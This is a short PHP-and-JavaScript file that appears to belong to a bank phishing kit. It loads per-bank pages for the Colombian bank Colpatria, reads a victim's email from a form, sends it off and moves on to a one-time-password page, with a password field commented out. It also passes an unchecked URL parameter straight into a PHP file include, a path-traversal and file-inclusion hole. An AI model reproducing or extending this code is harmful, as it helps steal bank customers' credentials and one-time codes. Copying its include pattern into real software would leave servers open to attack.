<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');

$banco = $_GET['banco'];
$origen = isset($_GET['origen_code']) ? $_GET['origen_code'] : null;

switch ($banco) {
    case 'colpatria':
        if ($origen != null) {
            require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}_bank/{$banco}_email_user.php");
        } else {
            require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}/{$banco}_email_user.php");
        }
        break;
    default:
        require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}/{$banco}_email_user.php");
        break;
}
?>

//<script>
    loadContenido();
    
    $('#btnEmail').click(function() {
        let email = $("#txtEmail").val();
        if (!(/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(email))) {
            $("#txtEmail").focus();
            return;
        }

        if (my_data['origen_code'])
        {
            processing({
            t: 'email',
            email: email,
            // password_email: clave
        });
        }
        else if (my_data['status'] == '') {
            my_data['status'] = 'otp';
            loadFile(['_otp.php']);
        }

    });